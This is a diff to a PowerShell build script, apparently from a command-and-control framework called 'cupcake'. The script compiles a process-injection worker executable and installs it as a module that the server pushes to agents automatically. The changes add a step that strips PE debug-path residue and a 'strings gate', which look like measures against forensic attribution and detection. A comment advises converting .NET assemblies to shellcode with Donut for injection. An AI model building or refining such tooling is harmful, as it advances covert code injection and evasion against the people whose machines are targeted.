@@ -1,35 +1,54 @@
-# Build L2 process-inject module and install as storage/modules/inject.bin
+# Build L2 inject sacrificial worker -> storage/modules/inject.bin
+#
+# Architecture v2: inject = standalone short-lived worker EXE (process
+# isolation). .NET assemblies are retired: convert them to shellcode
+# (e.g. Donut) and inject through this module.
+#
+# Post-processing: strips RSDS/PDB debug-directory residue (pe-strip-debug.py),
+# then runs the strings gate.
+#
 # Usage:
 #   powershell -File scripts/build-inject-module.ps1
 
 $ErrorActionPreference = "Stop"
 $ServerRoot = Split-Path -Parent $PSScriptRoot
-$ClientRoot = Join-Path (Split-Path -Parent $ServerRoot) "Client"
-$OutDir = Join-Path $ServerRoot "storage\modules"
-$DllName = "cupcake_mod_inject.dll"
+$RepoRoot   = Split-Path -Parent $ServerRoot
+$ClientRoot = Join-Path $RepoRoot "Client"
+$OutDir     = Join-Path $ServerRoot "storage\modules"
+$ExeName    = "cupcake-inject-worker.exe"
+$StripPy    = Join-Path $PSScriptRoot "pe-strip-debug.py"
+$Gate       = Join-Path $ClientRoot "scripts\strings-gate.ps1"
 
 if (-not (Test-Path $ClientRoot)) {
     throw "Client tree not found: $ClientRoot"
 }
 
-Write-Host "[*] cargo build -p cupcake-mod-inject --release"
-Set-Location $ClientRoot
-cargo build -p cupcake-mod-inject --release
-if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
-
-$src = Join-Path $ClientRoot "target\release\$DllName"
-if (-not (Test-Path $src)) {
-    # MSVC may produce .dll next to deps
-    $alt = Get-ChildItem -Path (Join-Path $ClientRoot "target\release") -Filter $DllName -Recurse -ErrorAction SilentlyContinue |
-        Select-Object -First 1 -ExpandProperty FullName
-    if ($alt) { $src = $alt }
+Write-Host "[*] cargo build -p cupcake-inject-worker --release"
+Push-Location $ClientRoot
+try {
+    cargo build -p cupcake-inject-worker --release
+    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+} finally {
+    Pop-Location
 }
+
+$src = Join-Path $ClientRoot "target\release\$ExeName"
 if (-not (Test-Path $src)) {
-    throw "built DLL not found: $DllName under target/release"
+    throw "built EXE not found: $src"
 }
 
 New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
 $dst = Join-Path $OutDir "inject.bin"
 Copy-Item -Force $src $dst
+
+Write-Host "[*] stripping PE debug directory (RSDS/PDB path residue)"
+python $StripPy $dst
+if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
 Write-Host "[+] Installed $dst ($((Get-Item $dst).Length) bytes)"
 Write-Host "    Push via Modules UI or auto on module_required:inject"
+
+if (Test-Path $Gate) {
+    & $Gate -Path $dst
+    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+}
